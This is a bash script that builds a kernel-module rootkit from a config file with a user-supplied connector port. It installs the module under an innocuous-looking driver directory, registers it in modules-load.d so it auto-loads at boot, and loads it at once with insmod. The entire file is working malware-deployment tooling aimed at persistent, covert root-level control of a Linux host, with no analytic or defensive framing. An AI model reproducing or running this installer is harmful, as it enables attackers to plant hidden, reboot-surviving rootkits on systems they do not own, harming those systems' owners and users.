#!/bin/bash

# Rootkit Installation Script for Persistence
# This script installs the rootkit to survive reboots

set -e

# Check if running as root
if [ "$EUID" -ne 0 ]; then
    echo "[-] Please run as root (use sudo)"
    exit 1
fi

# Get port number from user input
echo ""
read -p "Enter the connector port number: " PORT_NUMBER
if [ -z "$PORT_NUMBER" ]; then
    echo "[-] Port number is required. Exiting."
    exit 1
fi

# Validate port number
if ! [[ "$PORT_NUMBER" =~ ^[0-9]+$ ]] || [ "$PORT_NUMBER" -lt 1 ] || [ "$PORT_NUMBER" -gt 65535 ]; then
    echo "[-] Invalid port number. Please enter a valid port (1-65535)."
    exit 1
fi

echo "[+] Using port: $PORT_NUMBER"

# Update config.yml with the new port number
echo "[+] Updating configuration with port $PORT_NUMBER..."
sed -i.bak "s/port: \"[0-9]*\"/port: \"$PORT_NUMBER\"/" rootkit_files/config.yml

# Build rootkit with updated configuration
echo "[+] Building rootkit..."
python3 builder.py -c rootkit_files/config.yml -o

# Get rootkit name from user input after build
if [ -z "$1" ]; then
    echo ""
    echo "Please provide the rootkit name:"
    echo "Usage: $0 <rootkit_name>"
    echo "Example: $0 project"
    read -p "Enter rootkit name: " ROOTKIT_NAME
    if [ -z "$ROOTKIT_NAME" ]; then
        echo "[-] No rootkit name provided. Exiting."
        exit 1
    fi
else
    ROOTKIT_NAME="$1"
fi

KERNEL_VERSION=$(uname -r)
INSTALL_DIR="/lib/modules/${KERNEL_VERSION}/kernel/drivers"
MODULE_DIR="${INSTALL_DIR}/linux-space"
MODULE_CONF="/etc/modules-load.d/${ROOTKIT_NAME}.conf"

echo "[+] Installing rootkit '${ROOTKIT_NAME}' for persistence..."

# Check if build was successful
if [ ! -f "${ROOTKIT_NAME}.ko" ]; then
    echo "[-] Build failed! Please check the build process manually."
    exit 1
fi
echo "[+] Rootkit built successfully!"

# Create module directory
echo "[+] Creating module directory: ${MODULE_DIR}"
mkdir -p "${MODULE_DIR}"

# Copy module to system location
echo "[+] Copying ${ROOTKIT_NAME}.ko to ${MODULE_DIR}/"
cp "${ROOTKIT_NAME}.ko" "${MODULE_DIR}/"

# Update module dependencies
echo "[+] Updating module dependencies..."
depmod -a

# Create module auto-load configuration
echo "[+] Creating auto-load configuration: ${MODULE_CONF}"
echo "${ROOTKIT_NAME}" > "${MODULE_CONF}"

# Load the module immediately using insmod (direct loading)
echo "[+] Loading rootkit module with insmod..."
insmod "${ROOTKIT_NAME}.ko"

# Verify module is loaded
if lsmod | grep -q "${ROOTKIT_NAME}"; then
    echo "[+] Rootkit successfully installed and loaded!"
    echo "[+] Module will automatically load on reboot"
    echo "[+] Installation complete!"
else
    echo "[-] Failed to load rootkit module"
    exit 1
fi

echo ""
echo "Installation Summary:"
echo "- Module installed to: ${MODULE_DIR}/${ROOTKIT_NAME}.ko"
echo "- Auto-load config: ${MODULE_CONF}"
echo "- Module status: $(lsmod | grep ${ROOTKIT_NAME} | awk '{print $1 " (loaded)"}')"
